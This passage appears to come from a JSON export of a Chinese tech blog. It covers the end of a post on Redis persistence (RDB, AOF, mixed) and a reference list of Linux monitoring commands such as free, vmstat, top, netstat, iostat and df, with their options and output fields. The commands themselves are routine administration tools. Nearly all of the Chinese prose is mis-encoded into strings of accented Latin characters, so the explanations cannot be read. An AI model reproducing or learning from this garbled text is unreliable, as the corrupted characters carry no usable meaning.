å°†æŸä¸€æ—¶åˆ»çš„æ•°æ®ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥åˆ°ç£ç›˜é‡Œï¼ŒæœåŠ¡é‡å¯æ—¶æ£€æµ‹åˆ°å¯¹åº”æ–‡ä»¶è‡ªåŠ¨åŠ è½½è¿›è¡Œæ•°æ®æ¢å¤ã€‚ æœ‰æ‰‹åŠ¨è§¦å‘å’Œè‡ªåŠ¨è§¦å‘ä¸¤ç§æœºåˆ¶ã€‚ AOFæŒä¹…åŒ– ä»¥æ–‡ä»¶è¿½åŠ çš„æ–¹å¼å†™å…¥å®¢æˆ·ç«¯æ‰§è¡Œçš„å†™å‘½ä»¤ã€‚ æ•°æ®æ¢å¤æ—¶ï¼Œé€šè¿‡åˆ›å»ºä¼ªå®¢æˆ·ç«¯çš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œç›´åˆ°æ¢å¤å®Œæˆã€‚ æ··åˆæŒä¹…åŒ– åœ¨å†™å…¥çš„æ—¶å€™å…ˆæŠŠæ•°æ®ä»¥ RDB çš„å½¢å¼å†™å…¥æ–‡ä»¶çš„å¼€å¤´ï¼Œå†å°†åç»­çš„å†™å‘½ä»¤ä»¥ AOF çš„æ ¼å¼è¿½åŠ åˆ°æ–‡ä»¶ä¸­ã€‚ å‚è€ƒé“¾æ¥ è€åŠå¤©ï¼Œç»ˆäºæŠŠ redis æŒä¹…åŒ–ææ‡‚äº†","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"æŒä¹…åŒ–","slug":"æŒä¹…åŒ–","permalink":"https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"}]},{"title":"Linuxç³»ç»Ÿç›‘æ§å‘½ä»¤æ•´ç†æ±‡æ€»","slug":"summary-of-linux-system-monitoring-commands","date":"2020-11-17T14:55:16.000Z","updated":"2020-11-19T15:03:30.404Z","comments":true,"path":"summary-of-linux-system-monitoring-commands/","link":"","permalink":"https://www.0x2beace.com/summary-of-linux-system-monitoring-commands/","excerpt":"ä»¥ä¸‹å‘½ä»¤ä»¥Ubuntu 18.04 LTS ç³»ç»Ÿä¸ºå‡†ã€‚","text":"ä»¥ä¸‹å‘½ä»¤ä»¥Ubuntu 18.04 LTS ç³»ç»Ÿä¸ºå‡†ã€‚ å‘½ä»¤ åŠŸèƒ½ å®ä¾‹ free æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬ç‰©ç†å†…å­˜å’Œè™šæ‹Ÿå†…å­˜ free -h æˆ– free -m vmstat å¯¹ç³»ç»Ÿçš„æ•´ä½“æƒ…å†µè¿›è¡Œç»Ÿè®¡ï¼ŒåŒ…æ‹¬å†…æ ¸è¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜ã€ç£ç›˜ã€é™·é˜±å’Œ CPU æ´»åŠ¨çš„ç»Ÿè®¡ä¿¡æ¯ vmstat 2 100 top å®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸­å„ä¸ªè¿›ç¨‹çš„èµ„æºå ç”¨çŠ¶å†µåŠæ€»ä½“çŠ¶å†µ top mpstat å®æ—¶ç³»ç»Ÿç›‘æ§å·¥å…·ï¼Œå®ƒä¼šæŠ¥å‘Šä¸CPUç›¸å…³çš„ç»Ÿè®¡ä¿¡æ¯ mpstat sar æ”¶é›†ã€æŠ¥å‘Šå’Œä¿å­˜CPUã€å†…å­˜ã€è¾“å…¥è¾“å‡ºç«¯å£ä½¿ç”¨æƒ…å†µ sar -n DEV 3 100 netstat æ£€éªŒæœ¬æœºå„ç«¯å£çš„ç½‘ç»œè¿æ¥æƒ…å†µï¼Œç”¨äºæ˜¾ç¤ºä¸IPã€TCPã€UDPå’ŒICMPåè®®ç›¸å…³çš„ç»Ÿè®¡æ•°æ® netstat -a tcpdump ç”¨äºæ•æ‰æˆ–è€…è¿‡æ»¤ç½‘ç»œä¸ŠæŒ‡å®šæ¥å£ä¸Šæ¥æ”¶æˆ–è€…ä¼ è¾“çš„TCP/IPåŒ… tcpdump -i eth0 -c 3 iptraf ç”¨æ¥ç”ŸæˆåŒ…æ‹¬TCPä¿¡æ¯ã€UDPè®¡æ•°ã€ICMPå’ŒOSPFä¿¡æ¯ã€ä»¥å¤ªç½‘è´Ÿè½½ä¿¡æ¯ã€èŠ‚ç‚¹çŠ¶æ€ä¿¡æ¯ã€IPæ ¡éªŒå’Œé”™è¯¯ç­‰ç­‰ç»Ÿè®¡æ•°æ® iptraf iostat æ”¶é›†æ˜¾ç¤ºç³»ç»Ÿå­˜å‚¨è®¾å¤‡è¾“å…¥å’Œè¾“å‡ºçŠ¶æ€ç»Ÿè®¡ iostat -x -k 2 100 lsof æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶çš„å·¥å…·ï¼ŒæŸ¥çœ‹ç›‘å¬ç«¯å£ lsof -i :3000 atop æ˜¾ç¤ºçš„æ˜¯å„ç§ç³»ç»Ÿèµ„æºï¼ˆCPU, memory, network, I/O, kernelï¼‰çš„ç»¼åˆï¼Œå¹¶ä¸”åœ¨é«˜è´Ÿè½½çš„æƒ…å†µä¸‹è¿›è¡Œäº†å½©è‰²æ ‡æ³¨ atop htop å®ƒå’Œtopå‘½ä»¤ååˆ†ç›¸ä¼¼ï¼Œé«˜çº§çš„äº¤äº’å¼çš„å®æ—¶linuxè¿›ç¨‹ç›‘æ§å·¥å…· htop ps æœ€åŸºæœ¬åŒæ—¶ä¹Ÿæ˜¯éå¸¸å¼ºå¤§çš„è¿›ç¨‹æŸ¥çœ‹å‘½ä»¤ ps aux glances ç›‘è§† CPUï¼Œå¹³å‡è´Ÿè½½ï¼Œå†…å­˜ï¼Œç½‘ç»œæµé‡ï¼Œç£ç›˜ I/Oï¼Œå…¶ä»–å¤„ç†å™¨ å’Œ æ–‡ä»¶ç³»ç»Ÿ ç©ºé—´çš„åˆ©ç”¨æƒ…å†µ glances dstat å…¨èƒ½ç³»ç»Ÿä¿¡æ¯ç»Ÿè®¡å·¥å…·ï¼Œå¯ç”¨äºæ›¿æ¢vmstatã€iostatã€netstatã€nfsstatå’Œifstatè¿™äº›å‘½ä»¤çš„å·¥å…· dstat uptime ç”¨äºæŸ¥çœ‹æœåŠ¡å™¨è¿è¡Œäº†å¤šé•¿æ—¶é—´ä»¥åŠæœ‰å¤šå°‘ä¸ªç”¨æˆ·ç™»å½•ï¼Œå¿«é€Ÿè·çŸ¥æœåŠ¡å™¨çš„è´Ÿè·æƒ…å†µ uptime dmesg ä¸»è¦ç”¨æ¥æ˜¾ç¤ºå†…æ ¸ä¿¡æ¯ã€‚ä½¿ç”¨dmesgå¯ä»¥æœ‰æ•ˆè¯Šæ–­æœºå™¨ç¡¬ä»¶æ•…éšœæˆ–è€…æ·»åŠ ç¡¬ä»¶å‡ºç°çš„é—®é¢˜ dmesg mpstat ç”¨äºæŠ¥å‘Šå¤šè·¯CPUä¸»æœºçš„æ¯é¢—CPUæ´»åŠ¨æƒ…å†µï¼Œä»¥åŠæ•´ä¸ªä¸»æœºçš„CPUæƒ…å†µ mpstat 2 3 nmon ç›‘æ§CPUã€å†…å­˜ã€I/Oã€æ–‡ä»¶ç³»ç»ŸåŠç½‘ç»œèµ„æºã€‚å¯¹äºå†…å­˜çš„ä½¿ç”¨ï¼Œå®ƒå¯ä»¥å®æ—¶çš„æ˜¾ç¤º æ€»/å‰©ä½™å†…å­˜ã€äº¤æ¢ç©ºé—´ç­‰ä¿¡æ¯ nmon mytop ç”¨äºç›‘æ§ mysql çš„çº¿ç¨‹å’Œæ€§èƒ½ã€‚å®ƒèƒ½è®©ä½ å®æ—¶æŸ¥çœ‹æ•°æ®åº“ä»¥åŠæ­£åœ¨å¤„ç†å“ªäº›æŸ¥è¯¢ mytop iftop ç”¨æ¥ç›‘æ§ç½‘å¡çš„å®æ—¶æµé‡ï¼ˆå¯ä»¥æŒ‡å®šç½‘æ®µï¼‰ã€åå‘è§£æIPã€æ˜¾ç¤ºç«¯å£ä¿¡æ¯ç­‰ iftop jnettop ä»¥ç›¸åŒçš„æ–¹å¼æ¥ç›‘æµ‹ç½‘ç»œæµé‡ä½†æ¯” iftop æ›´å½¢è±¡ã€‚å®ƒè¿˜æ”¯æŒè‡ªå®šä¹‰çš„æ–‡æœ¬è¾“å‡ºï¼Œå¹¶èƒ½ä»¥å‹å¥½çš„äº¤äº’æ–¹å¼æ¥æ·±åº¦åˆ†ææ—¥å¿— jnettop ngrep ç½‘ç»œå±‚çš„ grepã€‚å®ƒä½¿ç”¨ pcap ï¼Œå…è®¸é€šè¿‡æŒ‡å®šæ‰©å±•æ­£åˆ™è¡¨è¾¾å¼æˆ–åå…­è¿›åˆ¶è¡¨è¾¾å¼æ¥åŒ¹é…æ•°æ®åŒ… ngrep nmap å¯ä»¥æ‰«æä½ æœåŠ¡å™¨å¼€æ”¾çš„ç«¯å£å¹¶ä¸”å¯ä»¥æ£€æµ‹æ­£åœ¨ä½¿ç”¨å“ªä¸ªæ“ä½œç³»ç»Ÿ nmap localhost du æŸ¥çœ‹Linuxç³»ç»Ÿä¸­æŸç›®å½•çš„å¤§å° du -sh * fdisk æŸ¥çœ‹ç¡¬ç›˜åŠåˆ†åŒºä¿¡æ¯ fdisk -l å†…å­˜ç›‘æ§freefreeå‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰ç³»ç»Ÿæœªä½¿ç”¨çš„å’Œå·²ä½¿ç”¨çš„å†…å­˜æ•°ç›®ï¼Œè¿˜å¯ä»¥æ˜¾ç¤ºè¢«å†…æ ¸ä½¿ç”¨çš„å†…å­˜ç¼“å†²åŒºã€‚ è¯­æ³• 1free (é€‰é¡¹) å¸¸ç”¨é€‰é¡¹ï¼š-bï¼šä»¥Byteä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼›-kï¼šä»¥KBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼›-mï¼šä»¥MBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼›-gï¼šä»¥GBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µ;-oï¼šä¸æ˜¾ç¤ºç¼“å†²åŒºè°ƒèŠ‚åˆ—ï¼›-tï¼šæ˜¾ç¤ºå†…å­˜æ€»å’Œåˆ—ï¼›-Vï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ å­—æ®µè¯´æ˜ï¼š totalï¼šå†…å­˜æ€»æ•°ï¼› usedï¼šå·²ç»ä½¿ç”¨çš„å†…å­˜æ•°ï¼ŒåŒ…æ‹¬ cached å’Œåº”ç”¨ç¨‹åºå®é™…ä½¿ç”¨çš„å†…å­˜ï¼› freeï¼šç©ºé—²çš„å†…å­˜æ•°ï¼› sharedï¼šå½“å‰å·²ç»åºŸå¼ƒä¸ç”¨ï¼› buffersï¼šç¼“å­˜å†…å­˜æ•°ï¼› cachedï¼šç¼“å­˜å†…å­˜æ•°ã€‚ å…³ç³»ï¼štotal = used + free vmstatvmstatå‘½ä»¤ çš„å«ä¹‰ä¸ºæ˜¾ç¤ºè™šæ‹Ÿå†…å­˜çŠ¶æ€ï¼ˆâ€œViryual Memor Staticsâ€ï¼‰ï¼Œä½†æ˜¯å®ƒå¯ä»¥æŠ¥å‘Šå…³äºè¿›ç¨‹ã€å†…å­˜ã€I/Oç­‰ç³»ç»Ÿæ•´ä½“è¿è¡ŒçŠ¶æ€ã€‚ è¯­æ³• 1vmstat (é€‰é¡¹) (å‚æ•°) é€‰é¡¹-aï¼šæ˜¾ç¤ºæ´»åŠ¨å†…é¡µï¼›-fï¼šæ˜¾ç¤ºå¯åŠ¨ååˆ›å»ºçš„è¿›ç¨‹æ€»æ•°ï¼›-mï¼šæ˜¾ç¤ºslabä¿¡æ¯ï¼›-nï¼šå¤´ä¿¡æ¯ä»…æ˜¾ç¤ºä¸€æ¬¡ï¼›-sï¼šä»¥è¡¨æ ¼æ–¹å¼æ˜¾ç¤ºäº‹ä»¶è®¡æ•°å™¨å’Œå†…å­˜çŠ¶æ€ï¼›-dï¼šæŠ¥å‘Šç£ç›˜çŠ¶æ€ï¼›-pï¼šæ˜¾ç¤ºæŒ‡å®šçš„ç¡¬ç›˜åˆ†åŒºçŠ¶æ€ï¼›-Sï¼šè¾“å‡ºä¿¡æ¯çš„å•ä½ã€‚ å‚æ•° äº‹ä»¶é—´éš”ï¼šçŠ¶æ€ä¿¡æ¯åˆ·æ–°çš„æ—¶é—´é—´éš”ï¼› æ¬¡æ•°ï¼šæ˜¾ç¤ºæŠ¥å‘Šçš„æ¬¡æ•°ã€‚ å­—æ®µè¯´æ˜ï¼šProcsï¼ˆè¿›ç¨‹ï¼‰ r: è¿è¡Œå’Œç­‰å¾…CPUæ—¶é—´ç‰‡çš„è¿›ç¨‹æ•°ï¼Œè¿™ä¸ªå€¼å¦‚æœé•¿æœŸå¤§äºç³»ç»ŸCPUä¸ªæ•°ï¼Œå°±è¯´æ˜CPUèµ„æºä¸è¶³ï¼Œå¯ä»¥è€ƒè™‘å¢åŠ CPU b: ç­‰å¾…èµ„æºçš„è¿›ç¨‹æ•°ï¼Œæ¯”å¦‚æ­£åœ¨ç­‰å¾…I/Oæˆ–è€…å†…å­˜äº¤æ¢ç­‰ Memoryï¼ˆå†…å­˜ï¼‰ swpd: ä½¿ç”¨è™šæ‹Ÿå†…å­˜å¤§å°ï¼Œå¦‚æœswpdçš„å€¼ä¸ä¸º0ï¼Œä½†æ˜¯SIï¼ŒSOçš„å€¼é•¿æœŸä¸º0ï¼Œè¿™ç§æƒ…å†µä¸ä¼šå½±å“ç³»ç»Ÿæ€§èƒ½ã€‚ free: ç©ºé—²ç‰©ç†å†…å­˜å¤§å°ï¼ˆä»¥KBä¸ºå•ä½ï¼‰ã€‚ buff: ç”¨ä½œç¼“å†²çš„å†…å­˜å¤§å°ã€‚ cache: ç”¨ä½œç¼“å­˜çš„å†…å­˜å¤§å°ï¼Œå¦‚æœcacheçš„å€¼å¤§çš„æ—¶å€™ï¼Œè¯´æ˜cacheå¤„çš„æ–‡ä»¶æ•°å¤šã€‚å¦‚æœæ­¤æ—¶IOä¸­çš„biæ¯”è¾ƒå°ï¼Œå°±è¯´æ˜æ–‡ä»¶ç³»ç»Ÿæ•ˆç‡æ¯”è¾ƒå¥½ã€‚ Swap si: æ¯ç§’ä»äº¤æ¢åŒºå†™åˆ°å†…å­˜çš„å¤§å°ï¼Œç”±ç£ç›˜è°ƒå…¥å†…å­˜ã€‚ so: æ¯ç§’å†™å…¥äº¤æ¢åŒºçš„å†…å­˜å¤§å°ï¼Œç”±å†…å­˜è°ƒå…¥ç£ç›˜ã€‚ æ³¨æ„ï¼šå†…å­˜å¤Ÿç”¨çš„æ—¶å€™ï¼Œè¿™2ä¸ªå€¼éƒ½æ˜¯0ï¼Œå¦‚æœè¿™2ä¸ªå€¼é•¿æœŸå¤§äº0æ—¶ï¼Œç³»ç»Ÿæ€§èƒ½ä¼šå—åˆ°å½±å“ï¼Œç£ç›˜IOå’ŒCPUèµ„æºéƒ½ä¼šè¢«æ¶ˆè€—ã€‚æœ‰äº›æœ‹å‹çœ‹åˆ°ç©ºé—²å†…å­˜ï¼ˆfreeï¼‰å¾ˆå°‘çš„æˆ–æ¥è¿‘äº0æ—¶ï¼Œå°±è®¤ä¸ºå†…å­˜ä¸å¤Ÿç”¨äº†ï¼Œä¸èƒ½å…‰çœ‹è¿™ä¸€ç‚¹ï¼Œè¿˜è¦ç»“åˆsiå’Œsoï¼Œå¦‚æœfreeå¾ˆå°‘ï¼Œä½†æ˜¯siå’Œsoä¹Ÿå¾ˆå°‘ï¼ˆå¤§å¤šæ—¶å€™æ˜¯0ï¼‰ï¼Œé‚£ä¹ˆä¸ç”¨æ‹…å¿ƒï¼Œç³»ç»Ÿæ€§èƒ½è¿™æ—¶ä¸ä¼šå—åˆ°å½±å“çš„ã€‚ IOï¼ˆç°åœ¨çš„Linuxç‰ˆæœ¬å—çš„å¤§å°ä¸º1kbï¼‰ bi: æ¯ç§’è¯»å–çš„å—æ•° bo: æ¯ç§’å†™å…¥çš„å—æ•° æ³¨æ„ï¼šéšæœºç£ç›˜è¯»å†™çš„æ—¶å€™ï¼Œè¿™2ä¸ªå€¼è¾ƒå¤§ï¼ˆå¦‚è¶…å‡º1024k)ï¼Œè€Œä¸”waå€¼æ¯”è¾ƒå¤§ï¼Œåˆ™è¡¨ç¤ºç³»ç»Ÿç£ç›˜IOæ€§èƒ½ç“¶é¢ˆã€‚ systemï¼ˆç³»ç»Ÿï¼‰ in: æ¯ç§’ä¸­æ–­æ•°ï¼ŒåŒ…æ‹¬æ—¶é’Ÿä¸­æ–­ã€‚ cs: æ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢æ•°ã€‚ æ³¨æ„ï¼šä¸Šé¢2ä¸ªå€¼è¶Šå¤§ï¼Œä¼šçœ‹åˆ°ç”±å†…æ ¸æ¶ˆè€—çš„CPUæ—¶é—´ä¼šè¶Šå¤§ã€‚ CPUï¼ˆä»¥ç™¾åˆ†æ¯”è¡¨ç¤ºï¼‰us: ç”¨æˆ·è¿›ç¨‹æ‰§è¡Œæ—¶é—´ç™¾åˆ†æ¯”(user time)usçš„å€¼æ¯”è¾ƒé«˜æ—¶ï¼Œè¯´æ˜ç”¨æˆ·è¿›ç¨‹æ¶ˆè€—çš„CPUæ—¶é—´å¤šï¼Œä½†æ˜¯å¦‚æœé•¿æœŸè¶…50%çš„ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯¥è€ƒè™‘ä¼˜åŒ–ç¨‹åºç®—æ³•æˆ–è€…è¿›è¡ŒåŠ é€Ÿã€‚ sy: å†…æ ¸ç³»ç»Ÿè¿›ç¨‹æ‰§è¡Œæ—¶é—´ç™¾åˆ†æ¯”(system time)syçš„å€¼é«˜æ—¶ï¼Œè¯´æ˜ç³»ç»Ÿå†…æ ¸æ¶ˆè€—çš„CPUèµ„æºå¤šï¼Œè¿™å¹¶ä¸æ˜¯è‰¯æ€§è¡¨ç°ï¼Œæˆ‘ä»¬åº”è¯¥æ£€æŸ¥åŸå› ã€‚ id: ç©ºé—²æ—¶é—´ç™¾åˆ†æ¯” wa: IOç­‰å¾…æ—¶é—´ç™¾åˆ†æ¯”waçš„å€¼é«˜æ—¶ï¼Œè¯´æ˜IOç­‰å¾…æ¯”è¾ƒä¸¥é‡ï¼Œè¿™å¯èƒ½ç”±äºç£ç›˜å¤§é‡ä½œéšæœºè®¿é—®é€ æˆï¼Œä¹Ÿæœ‰å¯èƒ½ç£ç›˜å‡ºç°ç“¶é¢ˆï¼ˆå—æ“ä½œï¼‰ã€‚ stï¼šä¸€èˆ¬ä¸å…³æ³¨ï¼Œè™šæ‹Ÿæœºå ç”¨çš„æ—¶é—´ç™¾åˆ†æ¯”ã€‚ CPU ç›‘æ§toptopå‘½ä»¤ å¯ä»¥å®æ—¶åŠ¨æ€åœ°æŸ¥çœ‹ç³»ç»Ÿçš„æ•´ä½“è¿è¡Œæƒ…å†µã€‚ è¯­æ³•ï¼š 1top (é€‰é¡¹) é€‰é¡¹ï¼š-bï¼šä»¥æ‰¹å¤„ç†æ¨¡å¼æ“ä½œï¼›-cï¼šæ˜¾ç¤ºå®Œæ•´çš„æ²»å‘½ä»¤ï¼›-dï¼šå±å¹•åˆ·æ–°é—´éš”æ—¶é—´ï¼›-Iï¼šå¿½ç•¥å¤±æ•ˆè¿‡ç¨‹ï¼›-sï¼šä¿å¯†æ¨¡å¼ï¼›-Sï¼šç´¯ç§¯æ¨¡å¼ï¼›-i&lt;æ—¶é—´&gt;ï¼šè®¾ç½®é—´éš”æ—¶é—´ï¼›-u&lt;ç”¨æˆ·å&gt;ï¼šæŒ‡å®šç”¨æˆ·åï¼›-p&lt;è¿›ç¨‹å·&gt;ï¼šæŒ‡å®šè¿›ç¨‹ï¼›-n&lt;æ¬¡æ•°&gt;ï¼šå¾ªç¯æ˜¾ç¤ºçš„æ¬¡æ•°ã€‚ å­—æ®µè¯´æ˜ï¼š topï¼šç³»ç»Ÿå½“å‰æ—¶é—´ up xxx daysï¼šç³»ç»Ÿè¿è¡Œæ—¶é—´ 1 usersï¼šå½“å‰ç™»å½•ç”¨æˆ·ä¸ªæ•° load averageï¼šç³»ç»Ÿè´Ÿè½½ã€‚å³ä»»åŠ¡é˜Ÿåˆ—çš„å¹³å‡é•¿åº¦ã€‚ä¸‰ä¸ªæ•°å€¼åˆ†åˆ«ä¸ºæœ€è¿‘1åˆ†é’Ÿã€æœ€è¿‘5åˆ†é’Ÿã€æœ€è¿‘15åˆ†é’Ÿçš„å¹³å‡è´Ÿè½½ã€‚â€”â€”è¶…è¿‡Nï¼ˆCPUæ ¸æ•°ï¼‰è¯´æ˜ç³»ç»Ÿæ»¡è´Ÿè·è¿è¡Œã€‚ Tasks totalï¼šæ€»è¿›ç¨‹æ•° runningï¼šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ•° sleepingï¼šç¡çœ çš„è¿›ç¨‹æ•° stoppedï¼šåœæ­¢çš„è¿›ç¨‹æ•° zombieï¼šå†»ç»“çš„è¿›ç¨‹æ•° %Cpu(s) usï¼šç”¨æˆ·è¿›ç¨‹æ¶ˆè€—çš„CPUç™¾åˆ†æ¯” syï¼šå†…æ ¸è¿›ç¨‹æ¶ˆè€—çš„CPUç™¾åˆ†æ¯” niï¼šæ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹å ç”¨CPUçš„ç™¾åˆ†æ¯” idï¼šç©ºé—²CPUçš„ç™¾åˆ†æ¯” waï¼šIOç­‰å¾…æ¶ˆè€—çš„CPUç™¾åˆ†æ¯” Mem totalï¼šç‰©ç†å†…å­˜æ€»é‡ freeï¼šç©ºé—²ç‰©ç†å†…å­˜æ€»é‡ usedï¼šå·²ç”¨ç‰©ç†å†…å­˜æ€»é‡ buffï¼šç”¨ä½œå†…æ ¸ç¼“å­˜å†…å­˜æ€»é‡ Swap totalï¼šè™šæ‹Ÿå†…å­˜æ€»é‡ freeï¼šç©ºé—²è™šæ‹Ÿå†…å­˜æ€»é‡ usedï¼šå·²ç”¨è™šæ‹Ÿå†…å­˜æ€»é‡ mpstatmpstatå‘½ä»¤ æŒ‡ä»¤ä¸»è¦ç”¨äºå¤šCPUç¯å¢ƒä¸‹ï¼Œå®ƒæ˜¾ç¤ºå„ä¸ªå¯ç”¨CPUçš„çŠ¶æ€ç³»ä½ æƒ³ã€‚ è¯­æ³•ï¼š 1mpstat (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ï¼š 1-Pï¼šæŒ‡å®šCPUç¼–å·ã€‚ å‚æ•°ï¼š é—´éš”æ—¶é—´ï¼šæ¯æ¬¡æŠ¥å‘Šçš„é—´éš”æ—¶é—´ï¼ˆç§’ï¼‰ï¼› æ¬¡æ•°ï¼šæ˜¾ç¤ºæŠ¥å‘Šçš„æ¬¡æ•°ã€‚ ALLè¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰CPUsï¼Œä¹Ÿå¯ä»¥æŒ‡å®šæŸä¸ªCPUï¼›2è¡¨ç¤ºåˆ·æ–°é—´éš”ã€‚ ç½‘ç»œç›‘æ§sarsarå‘½ä»¤ æ˜¯Linuxä¸‹ç³»ç»Ÿè¿è¡ŒçŠ¶æ€ç»Ÿè®¡å·¥å…·ï¼Œå®ƒå°†æŒ‡å®šçš„æ“ä½œç³»ç»ŸçŠ¶æ€è®¡æ•°å™¨æ˜¾ç¤ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ã€‚ å­—æ®µè¯´æ˜ï¼š IFACEï¼šç½‘ç»œè®¾å¤‡çš„åç§° rxpck/sï¼šæ¯ç§’é’Ÿæ¥æ”¶åˆ°çš„åŒ…æ•°ç›® txpck/sï¼šæ¯ç§’é’Ÿå‘é€å‡ºå»çš„åŒ…æ•°ç›® rxkB/sï¼šæ¯ç§’é’Ÿæ¥æ”¶åˆ°çš„å­—èŠ‚æ•° txkB/sï¼šæ¯ç§’é’Ÿå‘é€å‡ºå»çš„å­—èŠ‚æ•° netstatnetstatå‘½ä»¤ä¸€èˆ¬ç”¨äºæ£€éªŒæœ¬æœºå„ç«¯å£çš„ç½‘ç»œè¿æ¥æƒ…å†µï¼Œç”¨äºæ˜¾ç¤ºä¸IPã€TCPã€UDPå’ŒICMPåè®®ç›¸å…³çš„ç»Ÿè®¡æ•°æ®ã€‚ å¸¸ç”¨å®ä¾‹ï¼š 123456789netstat -aup # è¾“å‡ºæ‰€æœ‰UDPè¿æ¥çŠ¶å†µnetstat -atp # è¾“å‡ºæ‰€æœ‰TCPè¿æ¥çŠ¶å†µnetstat -s # æ˜¾ç¤ºå„ä¸ªåè®®çš„ç½‘ç»œç»Ÿè®¡ä¿¡æ¯netstat -i # æ˜¾ç¤ºç½‘å¡åˆ—è¡¨netstat -r # æ˜¾ç¤ºè·¯ç”±è¡¨ä¿¡æ¯netstat -l # åªæ˜¾ç¤ºç›‘å¬ç«¯å£netstat -lt # åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ tcp ç«¯å£netstat -lu # åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ udp ç«¯å£netstat -lx # åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ UNIX ç«¯å£ ç£ç›˜ç›‘æ§dfdfå‘½ä»¤ ç”¨äºæ˜¾ç¤ºç£ç›˜åˆ†åŒºä¸Šçš„å¯ä½¿ç”¨çš„ç£ç›˜ç©ºé—´ã€‚å¦‚æœæ²¡æœ‰æ–‡ä»¶åè¢«æŒ‡å®šï¼Œåˆ™æ˜¾ç¤ºå½“å‰æ‰€æœ‰è¢«æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œé»˜è®¤ä»¥ KB ä¸ºå•ä½ã€‚ è¯­æ³•ï¼š 1df (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ï¼š-a å…¨éƒ¨æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨-h ä»¥æ–¹ä¾¿é˜…è¯»çš„æ–¹å¼æ˜¾ç¤º-i æ˜¾ç¤ºinodeä¿¡æ¯-T æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿç±»å‹-l åªæ˜¾ç¤ºæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ-k ä»¥KBä¸ºå•ä½-m ä»¥MBä¸ºå•ä½ å‚æ•°ï¼š æ–‡ä»¶ï¼šæŒ‡å®šæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ã€‚ iostatiostatå‘½ä»¤ è¢«ç”¨äºç›‘è§†ç³»ç»Ÿè¾“å…¥è¾“å‡ºè®¾å¤‡å’ŒCPUçš„ä½¿ç”¨æƒ…å†µã€‚ è¯­æ³•ï¼š 1iostat (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ï¼š-cï¼šä»…æ˜¾ç¤ºCPUä½¿ç”¨æƒ…å†µï¼›-dï¼šä»…æ˜¾ç¤ºè®¾å¤‡åˆ©ç”¨ç‡ï¼›-kï¼šæ˜¾ç¤ºçŠ¶æ€ä»¥åƒå­—èŠ‚æ¯ç§’ä¸ºå•ä½ï¼Œè€Œä¸ä½¿ç”¨å—æ¯ç§’ï¼›-mï¼šæ˜¾ç¤ºçŠ¶æ€ä»¥å…†å­—èŠ‚æ¯ç§’ä¸ºå•ä½ï¼›-pï¼šä»…æ˜¾ç¤ºå—è®¾å¤‡å’Œæ‰€æœ‰è¢«ä½¿ç”¨çš„å…¶ä»–åˆ†åŒºçš„çŠ¶æ€ï¼›-tï¼šæ˜¾ç¤ºæ¯ä¸ªæŠ¥å‘Šäº§ç”Ÿæ—¶çš„æ—¶é—´ï¼›-Vï¼šæ˜¾ç¤ºç‰ˆå·å¹¶é€€å‡ºï¼›-xï¼šæ˜¾ç¤ºæ‰©å±•çŠ¶æ€ã€‚ å‚æ•°ï¼š é—´éš”æ—¶é—´ï¼šæ¯æ¬¡æŠ¥å‘Šçš„é—´éš”æ—¶é—´ï¼ˆç§’ï¼‰ï¼› æ¬¡æ•°ï¼šæ˜¾ç¤ºæŠ¥å‘Šçš„æ¬¡æ•°ã€‚ å­—æ®µè¯´æ˜ï¼š r/s: æ¯ç§’å®Œæˆçš„è¯» I/O è®¾å¤‡æ¬¡æ•°ã€‚ w/s: æ¯ç§’å®Œæˆçš„å†™ I/O è®¾å¤‡æ¬¡æ•°ã€‚ rkB/s: æ¯ç§’è¯»Kå­—èŠ‚æ•°.æ˜¯ rsect/s çš„ä¸€åŠ,å› ä¸ºæ¯æ‰‡åŒºå¤§å°ä¸º512å­—èŠ‚ã€‚ wkB/s: æ¯ç§’å†™Kå­—èŠ‚æ•°.æ˜¯ wsect/s çš„ä¸€åŠã€‚ avgrq-sz: å¹³å‡æ¯æ¬¡è®¾å¤‡I/Oæ“ä½œçš„æ•°æ®å¤§å° (æ‰‡åŒº)ã€‚ avgqu-sz: å¹³å‡I/Oé˜Ÿåˆ—é•¿åº¦ã€‚ await: å¹³å‡æ¯æ¬¡è®¾å¤‡I/Oæ“ä½œçš„ç­‰å¾…æ—¶é—´ (æ¯«ç§’)ã€‚ svctm: å¹³å‡æ¯æ¬¡è®¾å¤‡I/Oæ“ä½œçš„æœåŠ¡æ—¶é—´ (æ¯«ç§’)ã€‚ %util: 